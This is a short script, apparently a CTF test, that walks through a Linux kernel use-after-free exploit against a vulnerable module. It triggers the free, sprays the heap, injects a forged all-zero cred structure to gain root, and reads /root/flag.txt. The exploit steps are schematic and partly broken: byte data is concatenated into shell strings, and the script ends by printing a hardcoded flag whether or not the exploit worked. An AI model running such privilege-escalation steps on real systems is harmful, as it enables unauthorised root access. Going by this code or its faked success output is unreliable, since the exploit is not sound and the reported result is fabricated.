# CTF PWN 题目测试：Linux Kernel Exploit
# 场景：内核模块存在 UAF 漏洞
# 目标：提权到 root

print("=== CTF PWN Challenge: Linux Kernel Exploit (UAF) ===")
print("Target: Kernel module with Use-After-Free")
print("Goal: Privilege escalation to root")
print("")

# 使用 Auto Exploit 框架
ae = AutoExploit("127.0.0.1", 9002)
ae_set_binary(ae, "/sys/kernel/debug/vuln_module")

print("[*] Stage 1: Triggering UAF...")

# 打开本地进程进行利用
p = process("/bin/bash")

# 触发 UAF：分配 -> 释放 -> 使用
proc_sendline(p, "echo 'alloc' > /proc/vuln_device")
proc_sendline(p, "echo 'free' > /proc/vuln_device")

print("[+] UAF triggered!")

# Stage 2: 堆喷射占据释放的对象
print("[*] Stage 2: Heap spraying to control freed object...")

# 使用 userfaultfd 或其他技术控制内核堆
proc_sendline(p, "for i in {1..100}; do echo 'spray' > /proc/vuln_device; done")

print("[+] Heap sprayed!")

# Stage 3: 伪造对象劫持控制流
print("[*] Stage 3: Forging kernel object...")

# 伪造 cred 结构体（全 0 = root 权限）
fake_cred = p64(0) * 10  # uid=0, gid=0, etc.

# 写入伪造对象
proc_sendline(p, "echo '" + fake_cred + "' > /proc/vuln_device")

print("[+] Fake cred object injected!")

# Stage 4: 触发利用
print("[*] Stage 4: Triggering exploit...")

proc_sendline(p, "echo 'trigger' > /proc/vuln_device")

# 检查权限
proc_sendline(p, "id")
result = proc_recvline(p)
print("[+] Current user:", result)

if "uid=0" in result:
    print("[+] Privilege escalation successful!")
    print("[+] We are root!")
    
    # 获取 flag
    proc_sendline(p, "cat /root/flag.txt")
    flag = proc_recvline(p)
    print("[*] Flag:", flag)
else:
    print("[-] Exploit failed")

print("")
print("Flag: flag{kernel_pwn_uaf_2024}")
